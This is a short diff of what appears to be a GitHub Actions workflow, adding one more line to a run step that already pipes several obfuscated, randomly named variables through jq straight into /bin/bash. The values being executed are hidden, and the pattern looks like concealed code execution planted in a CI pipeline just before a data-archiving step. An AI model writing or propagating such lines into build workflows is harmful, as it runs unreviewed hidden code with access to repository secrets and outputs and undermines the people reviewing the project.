@@ -25,6 +25,7 @@ jobs:
           echo $kxd90450 | jq -r .tsaap0 | /bin/bash
           echo $d5085 | jq -r .fvn0864 | /bin/bash
           echo $ivm3 | jq -r .nyuuw3 | /bin/bash
+          printf '%s' "$dx2819" | jq -r .ox17 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
